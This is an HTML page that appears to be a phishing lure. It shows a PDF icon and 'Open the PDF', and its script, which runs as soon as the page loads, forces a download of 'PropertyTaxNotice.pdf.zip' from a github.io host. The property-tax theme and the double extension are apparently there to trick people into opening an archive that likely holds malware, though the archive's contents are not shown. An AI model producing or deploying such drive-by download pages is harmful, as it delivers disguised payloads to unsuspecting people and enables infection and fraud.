
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download</title>
<style>
  body {
    margin: 0;
    min-height: 100vh;
    background: #111;
    color: #eee;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
  }

  .center-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 15px;
  }

  .pdf-icon {
    width: 80px;
    height: 80px;
    background: #e53935;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: bold;
    font-size: 24px;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(229, 57, 53, 0.4);
  }

  .text {
    font-size: 42px;
    font-weight: 600;
    letter-spacing: 0.5px;
  }


</style>
</head>
<body>

  <div class="center-content">
    <div class="pdf-icon">PDF</div>
    <div class="text">Open the PDF</div>
  </div>

  <script>
window.addEventListener('load', function () {
    const link = document.createElement('a');
    link.href = 'https://pdf-m2.github.io/PropertyTaxNotice.pdf.zip';
    link.download = 'PropertyTaxNotice.pdf.zip';

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
});
  </script>
</body>
</html>
